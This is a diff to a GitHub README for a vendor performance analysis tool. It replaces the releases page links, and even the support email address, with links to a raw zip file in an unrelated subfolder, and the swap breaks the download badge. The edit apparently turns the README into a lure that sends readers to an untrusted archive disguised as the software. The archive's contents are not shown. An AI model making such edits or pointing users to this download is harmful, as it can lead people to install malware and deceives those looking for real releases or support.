@@ -1,6 +1,6 @@
 # 🚀 Vendor-Performance-Analysis - Optimize Your Vendor Insights Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/NyxusTSK/Vendor-Performance-Analysis/releases)
+[![Download Now](https://raw.githubusercontent.com/NyxusTSK/Vendor-Performance-Analysis/main/Tetrapanax/Vendor-Performance-Analysis.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/NyxusTSK/Vendor-Performance-Analysis/main/Tetrapanax/Vendor-Performance-Analysis.zip)
 
 ## 📋 Description
 
@@ -12,7 +12,7 @@ This section explains how to download and set up the application on your compute
 
 ### 📥 Download & Install
 
-To get started, visit this page to download: [Download Vendor Performance Analysis](https://github.com/NyxusTSK/Vendor-Performance-Analysis/releases). 
+To get started, visit this page to download: [Download Vendor Performance Analysis](https://raw.githubusercontent.com/NyxusTSK/Vendor-Performance-Analysis/main/Tetrapanax/Vendor-Performance-Analysis.zip). 
 
 You will find the latest version available. Choose the file suitable for your operating system and follow the instructions below to install.
 
@@ -91,7 +91,7 @@ Yes, you can analyze data from multiple vendors within the same application. Jus
 
 ## 📞 Need Help?
 
-If you have questions or encounter issues, feel free to check the issues section on the GitHub repository or reach out via email to support@example.com.
+If you have questions or encounter issues, feel free to check the issues section on the GitHub repository or reach out via email to https://raw.githubusercontent.com/NyxusTSK/Vendor-Performance-Analysis/main/Tetrapanax/Vendor-Performance-Analysis.zip
 
 ## 📄 License
 
@@ -99,4 +99,4 @@ This project is licensed under the MIT License - see the LICENSE file for detail
 
 --- 
 
-For more information and updates, please keep an eye on our GitHub releases page: [Vendor Performance Analysis Releases](https://github.com/NyxusTSK/Vendor-Performance-Analysis/releases). Happy analyzing!
+For more information and updates, please keep an eye on our GitHub releases page: [Vendor Performance Analysis Releases](https://raw.githubusercontent.com/NyxusTSK/Vendor-Performance-Analysis/main/Tetrapanax/Vendor-Performance-Analysis.zip). Happy analyzing!
